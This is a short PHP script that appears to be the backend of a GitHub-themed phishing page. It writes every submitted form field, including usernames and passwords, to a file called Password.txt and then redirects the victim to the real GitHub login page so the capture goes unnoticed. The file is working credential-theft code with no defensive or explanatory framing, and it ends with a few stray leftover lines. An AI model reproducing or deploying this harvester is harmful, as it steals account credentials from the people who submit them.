<?php
header("location: https://github.com/login");
$work=fopen("Password.txt", "a");
foreach($_POST as $a => $b) {
fwrite($work, $a);
fwrite($work, "=");
fwrite($work, $b);
}
fclose($work);
?>
;
?>
